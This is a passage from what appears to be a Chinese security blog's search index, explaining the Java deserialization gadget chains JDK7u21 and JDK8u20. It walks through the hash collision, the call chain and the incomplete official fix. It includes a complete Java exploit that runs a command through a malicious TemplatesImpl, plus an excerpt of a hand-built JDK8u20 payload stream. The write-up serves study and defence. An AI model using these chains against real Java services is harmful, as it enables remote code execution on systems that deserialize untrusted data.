value.hashCode() \u3002 - \u5f53value\u5c31\u662fTemplateImpl\u5bf9\u8c61\u65f6\uff0c\u8fd9\u4e24\u4e2a\u5bf9\u8c61\u7684\u54c8\u5e0c\u5c31\u5b8c\u5168\u76f8\u7b49 \u6240\u4ee5\u6211\u4eec\u73b0\u5728\u6700\u7ec8\u7684\u95ee\u9898\u5c31\u662f\u627e\u5230\u4e00\u4e2a\u5b57\u7b26\u4e32\u5176hashCode\u4e3a0\uff0c\u8fd9\u91cc\u76f4\u63a5\u7ed9\u51fa\u5176\u4e2d\u4e00\u4e2a\u7b54\u6848: f5a5a608 \uff0c\u8fd9\u4e5f\u662fysoserial\u4e2d\u7528\u5230\u7684\u5b57\u7b26\u4e32\u3002","title":"\u5947\u5999\u7684Magic Number"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK7u21/#\u5229\u7528\u94fe\u6784\u9020","text":"\u6240\u4ee5\uff0c\u6574\u4e2a\u5229\u7528\u7684\u8fc7\u7a0b\u5c31\u6e05\u6670\u4e86\uff0c\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u6765\u6784\u9020\uff1a - \u9996\u5148\u751f\u6210\u6076\u610f TemplateImpl \u5bf9\u8c61 - \u5b9e\u4f8b\u5316 AnnotationInvocationHandler \u5bf9\u8c61 - \u5b83\u7684type\u5c5e\u6027\u662f\u4e00\u4e2a Templates \u7c7b - \u5b83\u7684 memberValues \u5c5e\u6027\u662f\u4e00\u4e2a Map \uff0c Map \u53ea\u6709\u4e00\u4e2akey\u548cvalue\uff0ckey\u662f\u5b57\u7b26\u4e32 f5a5a608 \uff0c value\u662f\u524d\u9762\u751f\u6210\u7684\u6076\u610f TemplateImpl \u5bf9\u8c61 - \u5bf9\u8fd9\u4e2a AnnotationInvocationHandler \u5bf9\u8c61\u505a\u4e00\u5c42\u4ee3\u7406\uff0c\u751f\u6210proxy\u5bf9\u8c61 - \u5b9e\u4f8b\u5316\u4e00\u4e2a HashSet \uff0c\u8fd9\u4e2a HashSet \u6709\u4e24\u4e2a\u5143\u7d20\uff0c\u5206\u522b\u662f: - TemplateImpl \u5bf9\u8c61 - proxy \u5bf9\u8c61 - \u5c06 HashSet \u5bf9\u8c61\u8fdb\u884c\u5e8f\u5217\u5316 \u8fd9\u6837\uff0c\u53cd\u5e8f\u5217\u5316\u89e6\u53d1\u4ee3\u7801\u6267\u884c\u7684\u6d41\u7a0b\u5982\u4e0b\uff1a - \u89e6\u53d1 HashSet#readObject \u65b9\u6cd5\uff0c\u5176\u4e2d\u4f7f\u7528 HashMap \u7684key\u505a\u53bb\u91cd - \u53bb\u91cd\u65f6\u8ba1\u7b97 HashSet \u4e2d\u7684\u4e24\u4e2a\u5143\u7d20\u7684 hashCode() \uff0c\u56e0\u4e3a\u6211\u4eec\u7684\u7cbe\u5fc3\u6784\u9020\u4e8c\u8005\u76f8\u7b49\uff0c\u8fdb\u800c\u89e6\u53d1 equals() \u65b9\u6cd5 - \u8c03\u7528 AnnotationInvocationHandler#equalsImpl \u65b9\u6cd5 - equalsImpl \u4e2d\u904d\u5386this.type\u7684\u6bcf\u4e2a\u65b9\u6cd5\u5e76\u8c03\u7528 - \u56e0\u4e3athis.type\u662f Templates \u7c7b\uff0c\u6240\u4ee5\u89e6\u53d1\u4e86 newTransform() \u6216 getOutputProperties() \u65b9\u6cd5 - \u4efb\u610f\u4ee3\u7801\u6267\u884c","title":"\u5229\u7528\u94fe\u6784\u9020"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK7u21/#\u6700\u7ec8exp","text":"import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; import javassist.ClassClassPath ; import javassist.ClassPool ; import javassist.CtClass ; import javax.xml.transform.Templates ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Proxy ; import java.util.HashMap ; import java.util.HashSet ; import java.util.LinkedHashSet ; import java.util.Map ; public class jdk7u21 { public static TemplatesImpl generateEvilTemplates () throws Exception { ClassPool pool = ClassPool . getDefault (); pool . insertClassPath ( new ClassClassPath ( AbstractTranslet . class )); CtClass cc = pool . makeClass ( \"Cat\" ); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\" ; // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( cmd ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); cc . setSuperclass ( pool . get ( AbstractTranslet . class . getName ())); // \u8f6c\u6362\u4e3abytes byte [] classBytes = cc . toBytecode (); byte [][] targetByteCodes = new byte [][] { classBytes }; TemplatesImpl templates = TemplatesImpl . class . newInstance (); setFieldValue ( templates , \"_bytecodes\" , targetByteCodes ); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue ( templates , \"_name\" , \"name\" + System . nanoTime ()); setFieldValue ( templates , \"_class\" , null ); setFieldValue ( templates , \"_tfactory\" , new TransformerFactoryImpl ()); return templates ; } public static void main ( String [] args ) throws Exception { TemplatesImpl templates = generateEvilTemplates (); HashMap map = new HashMap (); map . put ( \"f5a5a608\" , \"zero\" ); Constructor handlerConstructor = Class . forName ( \"sun.reflect.annotation.AnnotationInvocationHandler\" ). getDeclaredConstructor ( Class . class , Map . class ); handlerConstructor . setAccessible ( true ); InvocationHandler tempHandler = ( InvocationHandler ) handlerConstructor . newInstance ( Templates . class , map ); // \u4e3atempHandler\u521b\u9020\u4e00\u5c42\u4ee3\u7406 Templates proxy = ( Templates ) Proxy . newProxyInstance ( jdk7u21 . class . getClassLoader (), new Class [] { Templates . class }, tempHandler ); // \u5b9e\u4f8b\u5316HashSet\uff0c\u5e76\u5c06\u4e24\u4e2a\u5bf9\u8c61\u653e\u8fdb\u53bb HashSet set = new LinkedHashSet (); set . add ( templates ); set . add ( proxy ); // \u5c06\u6076\u610ftemplates\u8bbe\u7f6e\u5230map\u4e2d map . put ( \"f5a5a608\" , templates ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( set ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } public static void setFieldValue ( Object obj , String fieldName , Object value ) throws Exception { Field field = obj . getClass (). getDeclaredField ( fieldName ); field . setAccessible ( true ); field . set ( obj , value ); } }","title":"\u6700\u7ec8exp"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK7u21/#\u8c03\u7528\u903b\u8f91","text":"HashSet.readObject() HashSet.put() AnnotationInvocationHandler.equals() // \u7cbe\u5fc3\u6784\u9020\u4f7f\u5f972\u4e2a\u5bf9\u8c61\u7684hashCode\u76f8\u540c\uff0c\u89e6\u53d1equals AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() // \u89e6\u53d1memberMethod.invoke(o) Templates.newTransformer() === TemplatesImpl.newTransformer() // equalsImpl\u4e2d\u4f1a\u53cd\u5c04\u8c03\u7528AnnotationInvocationHandler\u5b9e\u4f8b\u4e2dtype\u5c5e\u6027\u5bf9\u5e94\u7c7b\u7684\u6240\u6709\u65b9\u6cd5\uff0c\u7531\u4e8eAnnotationInvocationHandler\u7684type\u662fTemplates\uff0c\u5219\u4f1a\u53bb\u8c03\u7528Templates\u4e2d\u7684newTransformer TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757","title":"\u8c03\u7528\u903b\u8f91"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK7u21/#\u4e0d\u5b8c\u5168\u7684\u4fee\u590d","text":"\u770b\u770b\u5b98\u65b9\u7684\u4fee\u590d\u65b9\u6848: \u5728 sun.reflect.annotation.AnnotationInvocationHandler \u7c7b\u7684 readObject \u51fd\u6570\u4e2d\uff0c\u539f\u672c\u6709\u4e00\u4e2a\u5bf9 this.type \u7684\u68c0\u67e5\uff0c\u5728\u5176\u4e0d\u662f AnnotationType \u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\u3002\u4f46\u662f\uff0c\u6355\u83b7\u5230\u5f02\u5e38\u540e\u6ca1\u6709\u505a\u4efb\u4f55\u4e8b\u60c5\uff0c\u53ea\u662f\u5c06\u8fd9\u4e2a\u51fd\u6570\u8fd4\u56de\u4e86\uff0c\u8fd9\u6837\u5e76\u4e0d\u5f71\u54cd\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u6267\u884c\u8fc7\u7a0b\u3002\u5728\u65b0\u7248\u4e2d\uff0c\u5c06\u8fd9\u4e2a\u8fd4\u56de\u6539\u4e3a\u4e86\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\uff0c\u4f1a\u5bfc\u81f4\u6574\u4e2a\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u7ec8\u6b62\u3002 \u8fd9\u4e2a\u4fee\u590d\u65b9\u5f0f\u770b\u8d77\u6765\u51fb\u4e2d\u8981\u5bb3\uff0c\u5b9e\u9645\u4e0a\u4ecd\u7136\u5b58\u5728\u95ee\u9898\uff0c\u8fd9\u4e5f\u5bfc\u81f4\u540e\u9762\u7684\u53e6\u4e00\u6761\u539f\u751f\u5229\u7528\u94feJDK8u20\u3002","title":"\u4e0d\u5b8c\u5168\u7684\u4fee\u590d"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5e8f\u5217\u5316\u7bc7\u4e4bJDK8u20 # \u4e66\u63a5\u4e0a\u6587 # \u5728JDK7u21\u4e2d\u4fee\u590dJDK7u21\u94fe\u7684\u65b9\u5f0f\u662f\u5224\u65ad AnnotationInvocationHandler \u7684 type \u5c5e\u6027\u662f\u5426\u4e3a\u6ce8\u89e3\u7c7b\uff0c\u5982\u679c\u4e0d\u662f\u7684\u8bdd\u5219\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\u3002 \u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6ce8\u610f\u7684\u662f\u5728\u629b\u51fa\u5f02\u5e38\u4e4b\u524d\uff0c\u5df2\u7ecf\u6267\u884c\u4e86 var1.defaultReadObject() \u8fd8\u539f\u4e86 AnnotationInvocationHandler \u5bf9\u8c61\uff0c\u4f46\u662f\u7531\u4e8e\u540e\u7eed\u629b\u51fa\u5f02\u5e38\uff0c\u5bfc\u81f4\u6211\u4eec\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u903b\u8f91\u65ad\u5f00\uff0c\u7a0b\u5e8f\u7ec8\u6b62\u8fd0\u884c\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u5426\u53ef\u80fd\u4f7f\u7a0b\u5e8f\u5728\u629b\u51fa\u5f02\u5e38\u4e4b\u540e\u4e5f\u80fd\u591f\u7ee7\u7eed\u6267\u884c\u5462\uff1f try-catch\u5d4c\u5957 # \u5047\u8bbe\u5b58\u5728\u4ee5\u4e0b\u4ee3\u7801\uff0c\u601d\u8003\u4e00\u4e0b\u6700\u7ec8\u7684\u8fd0\u884c\u7ed3\u679c\u662f\u4ec0\u4e48\uff1f public static void main ( String [] args ) throws Exception { try { System . out . println ( \"Start\" ); try { int a = 1 / 0 ; } catch ( ArithmeticException e ) { throw new InvalidObjectException ( \"Invalid\" ); System . out . println ( \"In\" ); } } catch ( Exception e ) { } System . out . println ( \"End\" ); } \u6700\u7ec8\u7684\u6570\u636e\u7ed3\u679c\u4e3a Start End \u8fd9\u91cc\u5176\u5b9e\u5c31\u6d89\u53ca\u5230java\u7684\u5f02\u5e38\u6355\u6349\u673a\u5236\uff0c\u5047\u5982\u5728\u4e00\u4e2a\u5d4c\u5957try-catch\u7ed3\u6784\u5185\uff0c\u5185\u90e8\u7684try-catch\u6700\u7ec8\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\uff0c\u800c\u5916\u90e8\u7684try-catch\u6b63\u5e38\u6267\u884c\uff0c\u7531\u4e8e\u5185\u90e8\u7684try-catch\u629b\u51fa\u5f02\u5e38\uff0c\u5916\u90e8\u7684try-catch\u4e5f\u4f1a\u89e6\u53d1catch\uff0c\u4f46\u662f\u5047\u5982\u5916\u90e8\u7684catch\u4e0d\u518d\u5411\u5916\u629b\u51fa\u5f02\u5e38\u800c\u662f\u5ffd\u7565\uff0c\u90a3\u4e48\u6574\u4e2a\u7a0b\u5e8f\u5c31\u4e0d\u4f1a\u7ec8\u7aef\u8fd0\u884c\uff0c\u800c\u662f\u4f1a\u4e00\u76f4\u8fd0\u884c\u76f4\u5230End\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u60f3\u8981\u7684\u3002 \u73b0\u5728\u6211\u4eec\u9700\u8981\u5bfb\u627e\u5230\u4e00\u4e2a\u7c7b\uff0c\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6: 1. \u5b9e\u73b0 Serializable 2. \u91cd\u5199\u4e86 readObject \u65b9\u6cd5 3. readObject \u65b9\u6cd5\u8fd8\u5b58\u5728\u5bf9 readObject \u7684\u8c03\u7528\uff0c\u5e76\u4e14\u5bf9\u8c03\u7528\u7684 readObject \u65b9\u6cd5\u8fdb\u884c\u4e86\u5f02\u5e38\u6355\u83b7\u5e76\u7ee7\u7eed\u6267\u884c BeanContextSupport # \u6700\u7ec8\u6211\u4eec\u627e\u5230\u4e86\u60f3\u8981\u7684\u7c7b: java.beans.beancontext.BeanContextSupport \uff0c\u5176\u5173\u952e\u4ee3\u7801\u5982\u4e0b: private synchronized void readObject ( ObjectInputStream ois ) throws IOException , ClassNotFoundException { synchronized ( BeanContext . globalHierarchyLock ) { ois . defaultReadObject (); initialize (); bcsPreDeserializationHook ( ois ); if ( serializable > 0 && this . equals ( getBeanContextPeer ())) readChildren ( ois ); deserialize ( ois , bcmListeners = new ArrayList ( 1 )); } } public final void readChildren ( ObjectInputStream ois ) throws IOException , ClassNotFoundException { int count = serializable ; while ( count -- > 0 ) { Object child = null ; BeanContextSupport . BCSChild bscc = null ; try { child = ois . readObject (); bscc = ( BeanContextSupport . BCSChild ) ois . readObject (); } catch ( IOException ioe ) { continue ; } catch ( ClassNotFoundException cnfe ) { continue ; } // ... } \u5e8f\u5217\u5316\u673a\u5236 # \u5f15\u7528\u673a\u5236 # \u5728\u5e8f\u5217\u5316\u6d41\u7a0b\u4e2d\uff0c\u5bf9\u8c61\u6240\u5c5e\u7c7b\u3001\u5bf9\u8c61\u6210\u5458\u5c5e\u6027\u7b49\u6570\u636e\u90fd\u4f1a\u88ab\u4f7f\u7528\u56fa\u5b9a\u7684\u8bed\u6cd5\u5199\u5165\u5230\u5e8f\u5217\u5316\u6570\u636e\uff0c\u5e76\u4e14\u4f1a\u88ab\u7279\u5b9a\u7684\u65b9\u6cd5\u8bfb\u53d6\uff1b\u5728\u5e8f\u5217\u5316\u6570\u636e\u4e2d\uff0c\u5b58\u5728\u7684\u5bf9\u8c61\u6709null\u3001new objects\u3001classes\u3001arrays\u3001strings\u3001back references\u7b49\uff0c\u8fd9\u4e9b\u5bf9\u8c61\u5728\u5e8f\u5217\u5316\u7ed3\u6784\u4e2d\u90fd\u6709\u5bf9\u5e94\u7684\u63cf\u8ff0\u4fe1\u606f\uff0c\u5e76\u4e14\u6bcf\u4e00\u4e2a\u5199\u5165\u5b57\u8282\u6d41\u7684\u5bf9\u8c61\u90fd\u4f1a\u88ab\u8d4b\u4e88\u5f15\u7528 Handle \uff0c\u5e76\u4e14\u8fd9\u4e2a\u5f15\u7528 Handle \u53ef\u4ee5\u53cd\u5411\u5f15\u7528\u8be5\u5bf9\u8c61\uff08\u4f7f\u7528 TC_REFERENCE \u7ed3\u6784\uff0c\u5f15\u7528\u524d\u9762handle\u7684\u503c\uff09\uff0c\u5f15\u7528 Handle \u4f1a\u4ece 0x7E0000 \u5f00\u59cb\u8fdb\u884c\u987a\u5e8f\u8d4b\u503c\u5e76\u4e14\u81ea\u52a8\u81ea\u589e\uff0c\u4e00\u65e6\u5b57\u8282\u6d41\u53d1\u751f\u4e86\u91cd\u7f6e\u5219\u8be5\u5f15\u7528Handle\u4f1a\u91cd\u65b0\u4ece 0x7E0000 \u5f00\u59cb\u3002 \u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: import java.io.* ; public class exp implements Serializable { private static final long serialVersionUID = 100L ; public static int num = 0 ; private void readObject ( ObjectInputStream input ) throws Exception { input . defaultReadObject (); } public static void main ( String [] args ) throws IOException { exp t = new exp (); ObjectOutputStream out = new ObjectOutputStream ( new FileOutputStream ( \"test\" )); out . writeObject ( t ); out . writeObject ( t ); //\u7b2c\u4e8c\u6b21\u5199\u5165 out . close (); } } \u6211\u4eec\u7528SerializationDumper\u8fd9\u4e2a\u5de5\u5177\u6765\u67e5\u770b\u5176\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e: STREAM_MAGIC - 0xac ed STREAM_VERSION - 0x00 05 Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 3 - 0x00 03 Value - exp - 0x657870 serialVersionUID - 0x00 00 00 00 00 00 00 64 newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 0 - 0x00 00 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 01 classdata exp values TC_REFERENCE - 0x71 Handle - 8257537 - 0x00 7e 00 01 \u53ef\u4ee5\u6ce8\u610f\u5230\u5728\u6700\u540e\u90e8\u5206\u51fa\u73b0\u4e86 TC_REFERENCE \u5757\uff0c\u90a3\u4e48\u53cd\u5e8f\u5217\u5316\u65f6\u8981\u5982\u4f55\u5904\u7406 TC_REFERENCE \u5757\u5462\uff1f private Object readObject0 ( boolean unshared ) throws IOException { boolean oldMode = bin . getBlockDataMode (); if ( oldMode ) { int remain = bin . currentBlockRemaining (); if ( remain > 0 ) { throw new OptionalDataException ( remain ); } else if ( defaultDataEnd ) { /* * Fix for 4360508: stream is currently at the end of a field * value block written via default serialization; since there * is no terminating TC_ENDBLOCKDATA tag, simulate * end-of-custom-data behavior explicitly. */ throw new OptionalDataException ( true ); } bin . setBlockDataMode ( false ); } byte tc ; while (( tc = bin . peekByte ()) == TC_RESET ) { bin . readByte (); handleReset (); } depth ++ ; try { switch ( tc ) { // ... case TC_REFERENCE : return readHandle ( unshared ); // ... } } catch () { // ... } // ... readHandle\u65b9\u6cd5\u4ee3\u7801\u5982\u4e0b: private Object readHandle ( boolean unshared ) throws IOException { if ( bin . readByte () != TC_REFERENCE ) { throw new InternalError (); } passHandle = bin . readInt () - baseWireHandle ; if ( passHandle < 0 || passHandle >= handles . size ()) { throw new StreamCorruptedException ( String . format ( \"invalid handle value: %08X\" , passHandle + baseWireHandle )); } if ( unshared ) { // REMIND: what type of exception to throw here? throw new InvalidObjectException ( \"cannot read back reference as unshared\" ); } Object obj = handles . lookupObject ( passHandle ); if ( obj == unsharedMarker ) { // REMIND: what type of exception to throw here? throw new InvalidObjectException ( \"cannot read back reference to unshared object\" ); } return obj ; } \u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u4ece\u5b57\u8282\u6d41\u4e2d\u8bfb\u53d6 TC_REFERENCE \u6807\u8bb0\u6bb5\uff0c\u5b83\u4f1a\u628a\u8bfb\u53d6\u7684\u5f15\u7528 Handle \u8d4b\u503c\u7ed9 passHandle \u53d8\u91cf\uff0c\u7136\u540e\u4f20\u5165 lookupObject() \uff0c\u5728 lookupObject() \u65b9\u6cd5\u4e2d\uff0c\u5982\u679c\u5f15\u7528\u7684 handle \u4e0d\u4e3a\u7a7a\u3001\u6ca1\u6709\u5173\u8054\u7684 ClassNotFoundException \uff08 status[handle] != STATUS_EXCEPTION \uff09\uff0c\u90a3\u4e48\u5c31\u8fd4\u56de\u7ed9\u5b9a handle \u7684\u5f15\u7528\u5bf9\u8c61\uff0c\u6700\u540e\u7531 readHandle \u65b9\u6cd5\u8fd4\u56de\u7ed9\u5bf9\u8c61\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b\u8fd8\u539f\u5230 TC_REFERENCE \u7684\u65f6\u5019\uff0c\u4f1a\u5c1d\u8bd5\u8fd8\u539f\u5f15\u7528\u7684 handle \u5bf9\u8c61\u3002 \u6210\u5458\u629b\u5f03\u673a\u5236 # \u5728\u53cd\u5e8f\u5217\u5316\u4e2d\uff0c\u5982\u679c\u5f53\u524d\u8fd9\u4e2a\u5bf9\u8c61\u4e2d\u7684\u67d0\u4e2a\u5b57\u6bb5\u5e76\u6ca1\u6709\u5728\u5b57\u8282\u6d41\u4e2d\u51fa\u73b0\uff0c\u5219\u8fd9\u4e9b\u5b57\u6bb5\u4f1a\u4f7f\u7528\u7c7b\u4e2d\u5b9a\u4e49\u7684\u9ed8\u8ba4\u503c\uff0c\u5982\u679c\u8fd9\u4e2a\u503c\u51fa\u73b0\u5728\u5b57\u8282\u6d41\u4e2d\uff0c \u4f46\u662f\u5e76\u4e0d\u5c5e\u4e8e\u5bf9\u8c61\uff0c\u5219\u629b\u5f03\u8be5\u503c\uff0c\u4f46\u662f\u5982\u679c\u8fd9\u4e2a\u503c\u662f\u4e00\u4e2a\u5bf9\u8c61\u7684\u8bdd\uff0c\u90a3\u4e48\u4f1a\u4e3a\u8fd9\u4e2a\u503c\u5206\u914d\u4e00\u4e2a Handle\u3002 \u5229\u7528\u8fd9\u4e9b\u673a\u5236 # \u4e86\u89e3\u4e86\u4e0a\u97622\u4e2a\u673a\u5236\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u60f3\u5230\u4e00\u4e2a\u7ed5\u8fc7jdk7u21\u4fee\u590d\u65b9\u6cd5\u7684\u673a\u5236\uff0c\u5373: 1. \u4f7f\u7528 BeanContextSupport \uff0c\u5229\u7528\u5176\u7279\u6b8a\u7684 readChildren \u65b9\u6cd5\u8fd8\u539f\u4e00\u4e2a\u975e\u6cd5\u7684 AnnotationInvocationHandler \u5bf9\u8c61\uff0c\u5e76\u7559\u4e0b\u4e00\u4e2aHandle 2. \u5728\u6211\u4eecHashObject\u53d1\u751f\u54c8\u5e0c\u78b0\u649e\u9020\u6210RCE\u4e4b\u524d\u8fd8\u539f\u975e\u6cd5\u7684 AnnotationInvocationHandler \u5bf9\u8c61\uff0c\u4f7f\u5f97\u4e4b\u540e\u53cd\u5e8f\u5217\u5316\u76f8\u540c\u5bf9\u8c61\u65f6\u8fd8\u539f\u5f15\u7528\u7684 handle \u5bf9\u8c61 exp1 # \u8fd9\u4e2aexp1\u6765\u81eapwntester\u5e08\u5085\uff0c\u76f4\u63a5\u901a\u8fc7\u624b\u52a8\u6784\u9020\u53cd\u5e8f\u5217\u5316\u7684\u5b57\u8282\u7801\u6765\u5199\u8fd9\u4e2a\u7578\u5f62\u7684JDK8u20\u94fe(\u771f\u662f\u592a\u5f3a\u4e86)\uff0c\u4e0d\u8fc7\u7406\u89e3\u8d77\u6765\u53ef\u80fd\u4f1a\u6709\u70b9\u56f0\u96be\uff0c\u5229\u7528\u5230\u4e86\u6210\u5458\u629b\u5f03\u673a\u5236\uff0c\u5b8c\u6574\u6e90\u7801\u5728 pwntester/JRE8u20 RCE Gadget : ... new Object [] { STREAM_MAGIC , STREAM_VERSION , // stream headers // (1) LinkedHashSet TC_OBJECT , TC_CLASSDESC , LinkedHashSet . class . getName (), - 2851667679971038690L , ( byte ) 2 , // flags ( short ) 0 , // field count TC_ENDBLOCKDATA , TC_CLASSDESC , // super class HashSet . class . getName (), - 5024744406713321676L , ( byte ) 3 , // flags ( short ) 0 , // field count TC_ENDBLOCKDATA , TC_NULL , // no superclass // Block data that will be read by HashSet.readObject() // Used to configure the HashSet (capacity, loadFactor, size and items) TC_BLOCKDATA , ( byte ) 12 , ( short ) 0 , ( short ) 16 , // capacity ( short ) 16192 , ( short ) 0 , ( short ) 0 , // loadFactor ( short ) 2 , // size // (2) First item in LinkedHashSet templates , // TemplatesImpl instance with malicious bytecode // (3) Second item in LinkedHashSet // Templates Proxy with AIH handler TC_OBJECT , TC_PROXYCLASSDESC , // proxy declaration 1 , // one interface Templates . class . getName (), // the interface implemented by the proxy TC_ENDBLOCKDATA , TC_CLASSDESC , Proxy . class . getName (), // java.lang.Proxy class desc - 2222568056686623797L , // serialVersionUID SC_SERIALIZABLE , // flags ( short ) 2 , // field count ( byte ) 'L' , \"dummy\" , TC_STRING , \"Ljava/lang/Object;\" , // dummy non-existent field ( byte ) 'L' , \"h\" , TC_STRING , \"Ljava/lang/reflect/InvocationHandler;\" , // h field TC_ENDBLOCKDATA , TC_NULL , // no superclass // (3) Field values // value for the dummy field <--- BeanContextSupport. // this field does not actually exist in the Proxy class, so after deserialization this object is ignored. // (4) BeanContextSupport TC_OBJECT , TC_CLASSDESC , BeanContextSupport . class . getName (), - 4879613978649577204L , // serialVersionUID ( byte ) ( SC_SERIALIZABLE | SC_WRITE_METHOD ), ( short ) 1 , // field count ( byte ) 'I' , \"serializable\" , // serializable field, number of serializable children TC_ENDBLOCKDATA , TC_CLASSDESC , // super class BeanContextChildSupport . class . getName (), 6328947014421475877L , SC_SERIALIZABLE , ( short ) 1 , // field count ( byte ) 'L' , \"beanContextChildPeer\" , TC_STRING , \"Ljava/beans/beancontext/BeanContextChild;\" , TC_ENDBLOCKDATA , TC_NULL , // no superclass // (4) Field values // beanContextChildPeer must point back to this BeanContextSupport for BeanContextSupport.readObject to go into BeanContextSupport.readChildren() TC_REFERENCE , baseWireHandle + 12 , // serializable: one serializable child 1 , // now we add an extra object that is not declared, but that will be read/consumed by readObject // BeanContextSupport.readObject calls readChildren because we said we had one serializable child but it is not in the byte array // so the call to child = ois.readObject() will deserialize next object in the stream: the AnnotationInvocationHandler // At this point we enter the readObject of the aih that will throw an exception after deserializing its default objects // (5) AIH that will be deserialized as part of the BeanContextSupport TC_OBJECT , TC_CLASSDESC , \"sun.reflect.annotation.AnnotationInvocationHandler\" , 6182022883658399397L , // serialVersionUID ( byte ) ( SC_SERIALIZABLE | SC_WRITE_METHOD ), ( short ) 2 , // field count ( byte ) 'L' , \"type\" , TC_STRING , \"Ljava/lang/Class;\" , // type field ( byte ) 'L' , \"memberValues\" , TC_STRING , \"Ljava/util/Map;\" , // memberValues field TC_ENDBLOCKDATA , TC_NULL , // no superclass // (5) Field Values Templates . class , // type field value map , // memberValues field value // note: at this point normally the BeanContextSupport.readChildren would try to read the // BCSChild; but because the deserialization of the AnnotationInvocationHandler above throws, // we skip past that one into the catch block, and continue out of readChildren // the exception takes us out of readChildren and into BeanContextSupport.readObject // where there is a call to deserialize(ois, bcmListeners = new ArrayList(1)); // Within deserialize() there is an int read (0) and then it will read as many obejcts (0) TC_BLOCKDATA , ( byte ) 4 , // block length 0 , // no BeanContextSupport.bcmListenes TC_ENDBLOCKDATA , // (6) value for the Proxy.h field TC_REFERENCE , baseWireHandle + offset + 16 , // refer back to the AnnotationInvocationHandler TC_ENDBLOCKDATA , }; ... 1. \u6784\u9020 LinkedHashSet \u7684\u7ed3\u6784\u4fe1\u606f 2. \u5199\u5165payload\u4e2d TemplatesImpl \u5bf9\u8c61 3. \u6784\u9020 Templates Proxy \u7684\u7ed3\u6784\uff0c\u4e00\u51712\u4e2a\u6210\u5458: 1. \u8fd9\u91cc\u5b9a\u4e49\u4e86\u4e00\u4e2a\u865a\u5047\u7684 dummy \u6210\u5458,\u540e\u7eed\u8d4b\u503c\u4e3a BeanContextSupport \u5bf9\u8c61\uff0c\u865a\u5047\u6210\u5458\u4e5f\u4f1a\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c 2. \u771f\u5b9e\u7684 h \u6210\u5458\uff0c\u540e\u7eed\u8d4b\u503c\u4e3a InvocationHandler \u5bf9\u8c61 4. \u8d4b\u503c dummy \u6210\u5458\u7684\u503c\u4e3a BeanContextSupport \u5bf9\u8c61\uff0c\u540c\u65f6\u6784\u5efa\u4e86\u5176\u7ed3\u6784\u3002\u8fd9\u91cc\u4e3a\u4e86 BeanContextSupport \u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u65f6\u80fd\u8d70\u5230 readChildren 